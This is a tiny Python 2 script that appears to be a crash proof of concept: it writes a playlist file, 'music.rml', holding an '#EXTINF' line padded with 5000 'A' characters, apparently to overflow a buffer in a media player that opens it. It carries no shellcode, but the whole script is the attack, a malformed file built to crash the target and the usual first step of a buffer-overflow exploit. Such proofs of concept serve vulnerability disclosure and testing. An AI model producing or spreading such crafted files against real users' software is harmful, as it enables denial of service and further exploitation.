#!/usr/bin/python

content = (
"#EXTINF:Played=0\n" + "A" * 5000 + "\n"
)

fd = open("music.rml","w");
fd.write(content)
fd.close();

print "RML FILE CREATED"

